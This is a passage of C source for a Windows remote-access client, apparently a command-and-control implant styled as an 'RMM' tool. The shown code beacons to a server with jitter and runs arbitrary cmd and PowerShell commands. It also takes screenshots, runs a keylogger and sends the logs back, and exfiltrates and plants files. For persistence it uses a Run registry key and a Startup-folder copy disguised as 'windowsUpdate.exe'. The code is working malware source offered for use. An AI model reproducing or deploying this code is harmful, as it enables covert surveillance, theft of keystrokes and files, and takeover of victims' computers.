    if (!gp_bitmap) { pfn_shutdown(gdip_token); FreeLibrary(hgdip); return NULL; }

    /* Find PNG encoder CLSID */
    UINT num = 0, sz = 0;
    pfn_enc_sz(&num, &sz);
    ImageCodecInfo_t *codecs = (ImageCodecInfo_t*)malloc(sz);
    pfn_enc(num, sz, codecs);
    CLSID png_clsid = {0};
    for (UINT i = 0; i < num; i++) {
        if (codecs[i].MimeType && wcscmp(codecs[i].MimeType, L"image/png") == 0) {
            png_clsid = codecs[i].Clsid;
            break;
        }
    }
    free(codecs);

    /* Save to IStream in memory */
    IStream *stream = NULL;
    CreateStreamOnHGlobal(NULL, TRUE, &stream);
    pfn_save(gp_bitmap, stream, &png_clsid, NULL);
    pfn_dispose(gp_bitmap);

    /* Read stream bytes */
    STATSTG stat = {0};
    stream->lpVtbl->Stat(stream, &stat, STATFLAG_NONAME);
    ULARGE_INTEGER zero_pos = {0};
    stream->lpVtbl->Seek(stream, *(LARGE_INTEGER*)&zero_pos, STREAM_SEEK_SET, NULL);
    ULONG png_size = (ULONG)stat.cbSize.LowPart;
    unsigned char *png_data = (unsigned char*)malloc(png_size);
    ULONG read_bytes = 0;
    stream->lpVtbl->Read(stream, png_data, png_size, &read_bytes);
    stream->lpVtbl->Release(stream);

    pfn_shutdown(gdip_token);
    FreeLibrary(hgdip);

    char *b64 = b64_encode(png_data, read_bytes, NULL);
    free(png_data);
    return b64;
}

/* =========================================================================
 * Keylogger thread
 * ========================================================================= */

/* VK → printable name mapping for readable output */
static const char *vk_name(int vk) {
    static char buf[8];
    switch (vk) {
        case VK_BACK:    return "[BKSP]";
        case VK_TAB:     return "[TAB]";
        case VK_RETURN:  return "[ENTER]";
        case VK_SHIFT:   return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU:    return "[ALT]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_ESCAPE:  return "[ESC]";
        case VK_SPACE:   return " ";
        case VK_DELETE:  return "[DEL]";
        case VK_LWIN:    return "[WIN]";
        case VK_RWIN:    return "[WIN]";
        default:
            if (vk >= 'A' && vk <= 'Z') { buf[0] = (char)vk; buf[1] = '\0'; return buf; }
            if (vk >= '0' && vk <= '9') { buf[0] = (char)vk; buf[1] = '\0'; return buf; }
            snprintf(buf, sizeof(buf), "[%d]", vk);
            return buf;
    }
}

static DWORD WINAPI keylog_thread_proc(LPVOID param) {
    (void)param;
    BOOL key_down[256] = {0};
    char acc[4096];
    int  acc_len = 0;

    while (g_keylog_active) {
        for (int vk = 8; vk <= 254; vk++) {
            SHORT state = GetAsyncKeyState(vk);
            BOOL  pressed = (state & 0x8000) != 0;
            if (pressed && !key_down[vk]) {
                key_down[vk] = TRUE;
                const char *name = vk_name(vk);
                int nl = (int)strlen(name);
                if (acc_len + nl < (int)sizeof(acc) - 1) {
                    memcpy(acc + acc_len, name, nl);
                    acc_len += nl;
                }
            } else if (!pressed) {
                key_down[vk] = FALSE;
            }
        }
        if (acc_len >= KEYLOG_FLUSH_LEN) {
            acc[acc_len] = '\0';
            HANDLE hf = CreateFileA(g_keylog_path,
                                    GENERIC_WRITE, FILE_SHARE_READ,
                                    NULL, OPEN_ALWAYS, 0, NULL);
            if (hf != INVALID_HANDLE_VALUE) {
                SetFilePointer(hf, 0, NULL, FILE_END);
                DWORD wr;
                WriteFile(hf, acc, acc_len, &wr, NULL);
                CloseHandle(hf);
            }
            acc_len = 0;
        }
        Sleep(KEYLOG_POLL_MS);
    }

    /* Flush remaining */
    if (acc_len > 0) {
        acc[acc_len] = '\0';
        HANDLE hf = CreateFileA(g_keylog_path,
                                GENERIC_WRITE, FILE_SHARE_READ,
                                NULL, OPEN_ALWAYS, 0, NULL);
        if (hf != INVALID_HANDLE_VALUE) {
            SetFilePointer(hf, 0, NULL, FILE_END);
            DWORD wr;
            WriteFile(hf, acc, acc_len, &wr, NULL);
            CloseHandle(hf);
        }
    }
    return 0;
}

/* =========================================================================
 * Persistence
 * ========================================================================= */
static const char *PERSIST_EXE_NAME = "windowsUpdate.exe";
static const char *PERSIST_REG_KEY  = "WindowsUpdate";

static void install_persistence(void) {
    char startup[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup);

    char dest[MAX_PATH];
    snprintf(dest, MAX_PATH, "%s\\%s", startup, PERSIST_EXE_NAME);

    char self_path[MAX_PATH];
    GetModuleFileNameA(NULL, self_path, MAX_PATH);

    CopyFileA(self_path, dest, FALSE);

    /* Registry run key */
    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        char value[MAX_PATH + 32];
        snprintf(value, sizeof(value), "\"%s\"", dest);
        RegSetValueExA(hk, PERSIST_REG_KEY, 0, REG_SZ,
                       (BYTE*)value, (DWORD)strlen(value) + 1);
        RegCloseKey(hk);
    }
}

static void remove_persistence(void) {
    char startup[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup);

    char dest[MAX_PATH];
    snprintf(dest, MAX_PATH, "%s\\%s", startup, PERSIST_EXE_NAME);
    DeleteFileA(dest);

    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        RegDeleteValueA(hk, PERSIST_REG_KEY);
        RegCloseKey(hk);
    }
}

/* =========================================================================
 * Configuration update  (__CONFIG__ <sleep> <jitter>)
 * ========================================================================= */
static void handle_config(const char *config_str) {
    int new_sleep = 0, new_jitter = 0;
    /* config_str starts with "__CONFIG__ " */
    if (sscanf(config_str + 11, "%d %d", &new_sleep, &new_jitter) != 2) return;

    BOOL changed = FALSE;
    if (new_sleep >= 1 && new_sleep <= 3600 && new_sleep != g_sleep_sec) {
        g_sleep_sec = new_sleep; changed = TRUE;
        printf("[+] Sleep updated to %d s\n", g_sleep_sec);
    }
    if (new_jitter >= 0 && new_jitter <= 100 && new_jitter != g_jitter_pct) {
        g_jitter_pct = new_jitter; changed = TRUE;
        printf("[+] Jitter updated to %d%%\n", g_jitter_pct);
    }
    if (changed) {
        char ack[128];
        snprintf(ack, sizeof(ack),
                 "Configuration updated: Sleep=%d, Jitter=%d%%", g_sleep_sec, g_jitter_pct);
        rmm_post_result("config_ack", ack, (DWORD)strlen(ack), "text/plain");
    }
}

/* =========================================================================
 * Command dispatch
 * ========================================================================= */
static void dispatch_command(const char *command) {
    printf("[>] Command: %s\n", command);

    /* __CONFIG__ */
    if (strncmp(command, "__CONFIG__ ", 11) == 0) {
        handle_config(command);
        return;
    }

    /* __EXIT__ */
    if (strcmp(command, "__EXIT__") == 0) {
        printf("[*] Exit requested by server\n");
        /* Stop keylogger if running */
        if (g_keylog_active) {
            g_keylog_active = FALSE;
            if (g_keylog_thread) { WaitForSingleObject(g_keylog_thread, 2000); }
        }
        ExitProcess(0);
    }

    /* __STOP__ — handled by caller (persistent command cleared server-side) */
    if (strcmp(command, "__STOP__") == 0) {
        printf("[*] STOP received\n");
        return;
    }

    /* __DOWNLOAD__ <path> */
    if (strncmp(command, "__DOWNLOAD__ ", 13) == 0) {
        const char *path = command + 13;
        while (*path == ' ') path++;

        HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                                 NULL, OPEN_EXISTING, 0, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            char err[512];
            snprintf(err, sizeof(err), "File not found: %s", path);
            send_text_result(command, err);
            printf("[-] %s\n", err);
            return;
        }
        LARGE_INTEGER file_size;
        GetFileSizeEx(hf, &file_size);
        if (file_size.QuadPart > (LONGLONG)(UPLOAD_B64_CAP * 3 / 4)) {
            char err[256];
            snprintf(err, sizeof(err), "File too large for single-shot upload (%lld bytes)",
                     (long long)file_size.QuadPart);
            send_text_result(command, err);
            CloseHandle(hf);
            printf("[-] %s\n", err);
            return;
        }
        DWORD data_size = (DWORD)file_size.LowPart;
        unsigned char *data = (unsigned char*)malloc(data_size);
        DWORD rd = 0;
        ReadFile(hf, data, data_size, &rd, NULL);
        CloseHandle(hf);

        char *b64 = b64_encode(data, rd, NULL);
        free(data);

        /* Extract filename */
        const char *fname = path;
        for (const char *p = path; *p; p++)
            if (*p == '\\' || *p == '/') fname = p + 1;

        /* Build JSON: {"filename":"...","content":"..."} */
        size_t json_sz = strlen(fname) + strlen(b64) + 64;
        char  *json = (char*)malloc(json_sz);
        snprintf(json, json_sz, "{\"filename\":\"%s\",\"content\":\"%s\"}", fname, b64);
        free(b64);

        rmm_post_result("file_upload", json, (DWORD)strlen(json), "application/json");
        free(json);
        printf("[+] File exfiltrated: %s\n", path);
        return;
    }

    /* __UPLOAD__ <path>\n<JSON> */
    if (strncmp(command, "__UPLOAD__ ", 11) == 0) {
        const char *first_line_end = strchr(command, '\n');
        if (!first_line_end) {
            send_text_result(command, "Invalid __UPLOAD__ format");
            return;
        }
        /* Target path */
        int path_len = (int)(first_line_end - (command + 11));
        char target_path[MAX_PATH];
        if (path_len >= MAX_PATH) path_len = MAX_PATH - 1;
        strncpy(target_path, command + 11, path_len);
        target_path[path_len] = '\0';
        while (path_len > 0 && (target_path[path_len-1] == ' ' || target_path[path_len-1] == '\r'))
            target_path[--path_len] = '\0';

        /* JSON payload */
        const char *json = first_line_end + 1;
        char *content_b64 = (char*)malloc(UPLOAD_B64_CAP + 64);
        if (!content_b64) { send_text_result(command, "Out of memory"); return; }
        if (!json_get_string(json, "content", content_b64, UPLOAD_B64_CAP + 64)) {
            free(content_b64);
            send_text_result(command, "Missing 'content' in upload JSON");
            return;
        }
        size_t dec_len;
        unsigned char *dec = b64_decode(content_b64, strlen(content_b64), &dec_len);
        free(content_b64);
        if (!dec) { send_text_result(command, "Base64 decode failed"); return; }

        HANDLE hf = CreateFileA(target_path, GENERIC_WRITE, 0, NULL,
                                 CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            char err[512];
            snprintf(err, sizeof(err), "Cannot create file: %s", target_path);
            send_text_result(command, err);
            free(dec);
            return;
        }
        DWORD wr;
        WriteFile(hf, dec, (DWORD)dec_len, &wr, NULL);
        CloseHandle(hf);
        free(dec);

        char ok_msg[512];
        snprintf(ok_msg, sizeof(ok_msg), "File uploaded successfully: %s", target_path);
        send_text_result(command, ok_msg);
        printf("[+] File uploaded: %s\n", target_path);
        return;
    }

    /* __SCREENSHOT__ */
    if (strcmp(command, "__SCREENSHOT__") == 0) {
        char *b64 = capture_screenshot_b64();
        if (b64) {
            rmm_post_result("screenshot", b64, (DWORD)strlen(b64), "text/plain");
            free(b64);
            printf("[+] Screenshot sent\n");
        } else {
            send_text_result(command, "Screenshot failed (GDI+ unavailable or error)");
            printf("[-] Screenshot failed\n");
        }
        return;
    }

    /* __KEYLOG__ start|stop|dump */
    if (strncmp(command, "__KEYLOG__ ", 11) == 0) {
        const char *action = command + 11;
        while (*action == ' ') action++;

        if (_stricmp(action, "start") == 0) {
            if (g_keylog_active) {
                send_text_result(command, "Keylogger already running");
                return;
            }
            char tmp_path[MAX_PATH];
            GetTempPathA(MAX_PATH, tmp_path);
            snprintf(g_keylog_path, MAX_PATH, "%srmm_keylog_%.8s.log", tmp_path, g_session_id);
            DeleteFileA(g_keylog_path);  /* clear any old log */

            g_keylog_active = TRUE;
            g_keylog_thread = CreateThread(NULL, 0, keylog_thread_proc, NULL, 0, NULL);
            char msg[512];
            snprintf(msg, sizeof(msg), "Keylogger started; log: %s", g_keylog_path);
            send_text_result(command, msg);
            printf("[+] Keylogger started\n");
        } else if (_stricmp(action, "stop") == 0) {
            if (g_keylog_active) {
                g_keylog_active = FALSE;
                if (g_keylog_thread) {
                    WaitForSingleObject(g_keylog_thread, 3000);
                    CloseHandle(g_keylog_thread);
                    g_keylog_thread = NULL;
                }
            }
            send_text_result(command, "Keylogger stopped");
            printf("[+] Keylogger stopped\n");
        } else if (_stricmp(action, "dump") == 0) {
            HANDLE hf = CreateFileA(g_keylog_path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                                     NULL, OPEN_EXISTING, 0, NULL);
            if (hf == INVALID_HANDLE_VALUE) {
                rmm_post_result("keylog",
                                "(empty buffer)", (DWORD)strlen("(empty buffer)"),
                                "text/plain");
            } else {
                LARGE_INTEGER fsz;
                GetFileSizeEx(hf, &fsz);
                DWORD data_size = (DWORD)fsz.LowPart + 1;
                char *log_data = (char*)calloc(1, data_size);
                DWORD rd;
                ReadFile(hf, log_data, data_size - 1, &rd, NULL);
                CloseHandle(hf);
                if (rd == 0) {
                    rmm_post_result("keylog", "(empty buffer)", (DWORD)strlen("(empty buffer)"), "text/plain");
                } else {
                    rmm_post_result("keylog", log_data, rd, "text/plain");
                }
                free(log_data);
            }
            printf("[+] Keylog data sent\n");
        } else {
            send_text_result(command, "Unknown keylog action");
        }
        return;
    }

    /* __INSTALL_PERSIST__ */
    if (strcmp(command, "__INSTALL_PERSIST__") == 0) {
        install_persistence();
        send_text_result(command, "Persistence installed successfully");
        printf("[+] Persistence installed\n");
        return;
    }

    /* __REMOVE_PERSIST__ */
    if (strcmp(command, "__REMOVE_PERSIST__") == 0) {
        remove_persistence();
        send_text_result(command, "Persistence removed");
        printf("[+] Persistence removed\n");
        return;
    }

    /* --- User commands --- */
    /* PS: / powershell: */
    if (_strnicmp(command, "ps:", 3) == 0 || _strnicmp(command, "powershell:", 11) == 0) {
        const char *inner = strchr(command, ':') + 1;
        while (*inner == ' ') inner++;
        if (!*inner) { send_text_result(command, "Error: empty script after PS:"); return; }
        char *out = exec_powershell("powershell.exe", inner);
        send_text_result(command, out ? out : "(null)");
        free(out);
        return;
    }

    /* pwsh: */
    if (_strnicmp(command, "pwsh:", 5) == 0) {
        const char *inner = command + 5;
        while (*inner == ' ') inner++;
        if (!*inner) { send_text_result(command, "Error: empty script after pwsh:"); return; }
        /* Try pwsh.exe, fall back to powershell.exe */
        char pwsh_path[MAX_PATH];
        if (SearchPathA(NULL, "pwsh.exe", NULL, MAX_PATH, pwsh_path, NULL) == 0)
            strcpy(pwsh_path, "powershell.exe");
        char *out = exec_powershell(pwsh_path, inner);
        send_text_result(command, out ? out : "(null)");
        free(out);
        return;
    }

    /* cmd: prefix (explicit) */
    if (_strnicmp(command, "cmd:", 4) == 0) {
        const char *inner = command + 4;
        while (*inner == ' ') inner++;
        char *out = exec_cmd(inner);
        send_text_result(command, out ? out : "(null)");
        free(out);
        return;
    }

    /* Default: cmd.exe */
    char *out = exec_cmd(command);
    send_text_result(command, out ? out : "(null)");
    free(out);
}

/* =========================================================================
 * Main
 * ========================================================================= */
int main(void) {
    srand((unsigned)time(NULL) ^ GetCurrentProcessId());
    CoInitializeEx(NULL, COINIT_MULTITHREADED);

    /* ---- Base URL ---- */
    char env_url[512] = {0};
    GetEnvironmentVariableA("RMM_BASE_URL", env_url, sizeof(env_url));
    if (env_url[0]) {
        /* Trim trailing slash */
        int l = (int)strlen(env_url);
        while (l > 0 && env_url[l-1] == '/') env_url[--l] = '\0';
        strncpy(g_base_url, env_url, sizeof(g_base_url) - 1);
    } else {
        strncpy(g_base_url, DEFAULT_BASE_URL, sizeof(g_base_url) - 1);
    }
    if (strstr(g_base_url, "REPLACE-WITH-YOUR-CLOUDFLARED-URL")) {
        fprintf(stderr, "[-] Set RMM_BASE_URL or edit DEFAULT_BASE_URL in source.\n");
        return 1;
    }
    parse_base_url(g_base_url);

    /* ---- Session ID ---- */
    gen_guid(g_session_id, sizeof(g_session_id));

    /* ---- Initial CWD ---- */
    if (!GetEnvironmentVariableA("USERPROFILE", g_cwd, MAX_PATH))
        GetCurrentDirectoryA(MAX_PATH, g_cwd);

    printf("[*] RMM C Client  |  Session: %s\n", g_session_id);
    printf("[*] Server: %s  |  Beacon: %ds ± %d%%\n",
           g_base_url, g_sleep_sec, g_jitter_pct);

    /* ---- Registration with retry ---- */
    int reg_attempts = 0;
    while (1) {
        if (rmm_register()) { printf("[+] Registered\n"); break; }
        reg_attempts++;
        printf("[-] Registration failed (attempt %d/%d)\n", reg_attempts, MAX_RETRIES);
        if (reg_attempts >= MAX_RETRIES) {
            fprintf(stderr, "[-] Failed to register after %d attempts, exiting\n", MAX_RETRIES);
            return 1;
        }
        backoff_sleep(reg_attempts);
    }

    /* ---- Main beacon loop ---- */
    int failure_count = 0;
    while (1) {
        jittered_sleep(g_sleep_sec, g_jitter_pct);

        char *cmd_json = rmm_get_cmd();
        if (!cmd_json) {
            failure_count++;
            printf("[!] Poll failed (failure %d)\n", failure_count);
            if (failure_count <= MAX_RETRIES)
                backoff_sleep(failure_count);
            else {
                jittered_sleep(30, 50);
                failure_count = 0;
            }
            continue;
        }
        failure_count = 0;

        /* Parse JSON: {"command":"...","type":"..."} */
        char command[8192] = {0};
        char type[64] = "none";
        json_get_string(cmd_json, "command", command, sizeof(command));
        json_get_string(cmd_json, "type",    type,    sizeof(type));
        free(cmd_json);

        if (!command[0] || _stricmp(type, "none") == 0) continue;

        dispatch_command(command);
        printf("[+] Cycle complete\n");
    }

    CoUninitialize();
    return 0;
}
